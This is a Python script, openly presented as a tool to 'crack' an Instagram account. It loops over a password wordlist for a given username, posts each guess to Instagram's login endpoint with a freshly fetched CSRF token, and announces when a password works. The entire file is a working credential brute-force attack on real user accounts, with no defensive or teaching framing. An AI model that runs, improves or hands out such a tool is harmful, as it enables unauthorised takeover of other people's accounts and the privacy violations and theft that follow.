#!/usr/bin/env python
#  -*- coding: utf-8 -*-

import sys
import time
import requests
import json
from core import *


class Instagram:
    def __init__(self, username, wordlist, delay):
        self.username = username
        self.url = 'https://www.instagram.com/accounts/login/ajax/'
        self.wordlist = wordlist
        self.delay = delay
        self.glob = globals.Globals()
        self.col = globals.Colors()

    def banner(self):
        print (self.col.BLUE) + ("""
		 ▄▀█▀█▀█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄
		█  █ █ █               ▄▄▄▄▄ ▀▄
		█  █ █ █               █████   █
		█  █ █ █               █████   █
		█         ▄▄██████▄▄           █
		█▀▀▀▀▀▀▀▀██▀  ▄▄▄ ▀▀██▀▀▀▀▀▀▀▀▀█
		█      ▄██ ▄███████ ▀█▄        █
		█      ██  █████████ ██        █
		█      ██  ████████▀ ██        █
		█       ██▄ ▀█████▀ ▄█▀        █
		█        ▀██▄▄   ▄▄██▀         █
		█          ▀▀████▀▀            █
		█                              █
		█                             ▄▀
		▀▄                          ▄▀
		  ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀
		""") + (self.col.ENDC)

    def attack(self, password):
        try:
            sys.stdout.write("\r[*] trying '%s' .." % password)
            sys.stdout.flush()

            sess = requests.Session()
            sess.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '',
                 'ds_user_id': ''})
            sess.headers.update({
                'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                'x-instagram-ajax': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'origin': 'https://www.instagram.com',
                'ContentType': 'application/x-www-form-urlencoded',
                'Connection': 'keep-alive',
                'Accept': '*/*',
                'Referer': 'https://www.instagram.com',
                'authority': 'www.instagram.com',
                'Host': 'www.instagram.com',
                'Accept-Language': 'en-US;q=0.6,en;q=0.4',
                'Accept-Encoding': 'gzip, deflate'
            })

            # Update token after enter to the site
            r = sess.get('https://www.instagram.com/')
            sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})

            # Update token after login to the site
            r = sess.post(self.url, data={'username': self.username, 'password': password}, allow_redirects=True)
            sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})

            # parse response
            data = json.loads(r.text)

            if (data['status'] == 'fail'):
                self.glob.print_error(data['message'])

            if (data['authenticated'] == True):
                sys.stdout.write("\r")
                sys.stdout.flush()
                self.glob.print_status(
                    "Password found! Password: " + (self.col.GREEN) + (self.col.BOLD) + (password) + (self.col.ENDC))
                sys.exit(1)
            time.sleep(self.delay)
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)

    def search(self):
        global password
        for password in passwords:
            self.attack(password.replace("\n", ""))

    def crack(self):
        global br
        global passwords
        try:
            list = open(self.wordlist, "r")
            passwords = list.readlines()
            k = 0
            while k < len(passwords):
                passwords[k] = passwords[k].strip()
                k += 1
        except IOError:
            self.glob.print_error("Error: check your password list path!")
            sys.exit(1)
        except KeyboardInterrupt:
            self.glob.print_dead("Exiting program ..")
            sys.exit(1)
        try:
            self.glob.print_warning(
                "Account to crack: " + (self.col.YELLOW) + (self.col.BOLD) + (self.username) + (self.col.ENDC))
            self.glob.print_warning(
                "Loaded: " + (self.col.YELLOW) + (self.col.BOLD) + str(len(passwords)) + (self.col.ENDC) + " passwords")
        except KeyboardInterrupt:
            self.glob.print_dead("Exiting program ..")
            sys.exit(1)
        try:
            self.search()
            self.attack(password)
        except KeyboardInterrupt:
            self.glob.print_dead("Exiting program ..")
            sys.exit(1)


if __name__ == "__main__":
    username = sys.argv[1]
    wordlist = sys.argv[2]
    delay = sys.argv[3]
    f = Instagram(username, wordlist, delay)
    f.banner()
    f.crack()
